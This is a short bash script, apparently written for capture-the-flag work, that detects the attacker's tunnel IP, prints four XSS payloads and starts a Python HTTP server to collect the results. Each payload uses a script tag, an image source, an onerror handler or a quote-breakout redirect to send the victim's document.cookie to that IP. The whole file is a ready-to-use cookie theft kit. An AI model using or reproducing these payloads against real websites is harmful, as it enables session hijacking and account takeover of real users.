#!/bin/bash

# CTF script to generate XSS payloads for stealing cookies
port=80 #Change if needed
interface=tun0 #Also change if needed

RED="\e[31m"
GREEN="\e[32m"
ENDCOLOR="\e[0m"
BOLD="\e[1m"
UNDERLINE="\e[4m"

echo -e "\n\n🍪${RED}Rapid Cookie Theft${ENDCOLOR} 🍪"

ip=$(/sbin/ip -o -4 addr list $interface | awk '{print $4}' | cut -d/ -f1)

if [[ $ip == "" ]];
then
   echo -e "${RED}[-]${ENDCOLOR} Edit script with correct interface"
   echo -e "${RED}[-]${ENDCOLOR} Exiting...\n"
   exit
fi
echo -e "${GREEN}[+] ${ENDCOLOR}Listening interface: ${UNDERLINE}$interface${ENDCOLOR} with IP: ${UNDERLINE}$ip${ENDCOLOR}"
echo -e "${GREEN}[+] ${ENDCOLOR}Listening Port: ${UNDERLINE}$port${ENDCOLOR}"

#print payloads
echo -e "\n${RED}XSS Payloads:${ENDCOLOR}"
echo -e "---------------------------------------------------------------------------------------\n"
echo "<script>"
echo "fetch('$ip:$port', {"
echo "method: 'POST',"
echo "mode: 'no-cors',"
echo "body:document.cookie"
echo "});"
echo "</script>"
echo -e "\n---------------------------------------------------------------------------------------\n"
echo "<script>var i=new Image;i.src='$ip:$port/?'+document.cookie;</script>"
echo -e "\n---------------------------------------------------------------------------------------\n"
echo "<img src=x onerror=this.src='http://$ip:$port/?'+document.cookie;>"
echo -e "\n---------------------------------------------------------------------------------------\n"
echo -e "\"><script>document.location='http://$ip:$port/?'+document.cookie</script>"
echo -e "\n---------------------------------------------------------------------------------------\n"


echo -e "\n${GREEN}[+] ${ENDCOLOR}Starting HTTP server ${ENDCOLOR}"

#Start HTTP Server
python3 -m http.server $port
